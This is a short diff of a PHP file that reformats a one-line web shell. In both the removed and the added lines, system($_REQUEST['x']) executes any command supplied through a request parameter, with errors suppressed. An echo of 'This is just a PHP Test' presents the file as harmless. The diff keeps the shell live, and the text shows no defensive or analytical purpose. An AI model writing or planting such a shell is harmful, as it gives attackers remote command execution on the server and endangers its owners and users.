@@ -1,1 +1,2 @@
-<?=@system($_REQUEST['x']);?><?='This is just a PHP Test';?>
+<?= @system($_REQUEST['x']) ?>
+<?= 'This is just a PHP Test' ?>
